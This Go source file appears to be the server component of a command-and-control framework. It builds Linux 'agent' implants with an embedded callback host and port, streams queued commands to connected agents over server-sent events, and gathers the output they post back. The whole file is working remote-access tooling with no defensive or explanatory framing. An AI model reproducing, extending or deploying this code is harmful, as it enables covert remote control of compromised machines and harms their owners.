package server

import (
	"fmt"
	"os/exec"
	"net/http"
	"strconv"
)

func CreateAgent(lhost string, lport string, outputDir string) {
	linkerString := fmt.Sprintf("-X 'main.lhost=%s' -X 'main.lport=%s'", lhost, lport)

	cmd := exec.Command("go", "build", "-ldflags", linkerString, "-o", outputDir, "./cmd/client/linux/agents/main.go")
	err := cmd.Run();

	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf("Built agent to %s\n", outputDir)
	}
}

func (l *Listener) AgentSSE(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	sid := r.PathValue("id") + ":" + strconv.Itoa(l.id)
	session, ok := l.activeSessions[sid]
	if !ok {
		w.WriteHeader(404)
		return
	}

	for {
		select {
		case command := <-session.commChan:
			fmt.Fprintf(w, "data: %s\n\n", command.input)
			if f, ok := w.(http.Flusher); ok {
				f.Flush()
			}
		case <-r.Context().Done():
    		return
		}
	}
}

func (l *Listener) AgentResponse(w http.ResponseWriter, r *http.Request) {
	sid := r.PathValue("id") + ":" + strconv.Itoa(l.id)
	if sid == "" {
		fmt.Println("Malformed Request")
		return
	}
	session, ok := l.activeSessions[sid]
	if !ok {
		fmt.Println("Session does not exist")
		return
	}

	output := r.PostFormValue("output")
	session.respChan <- output
}
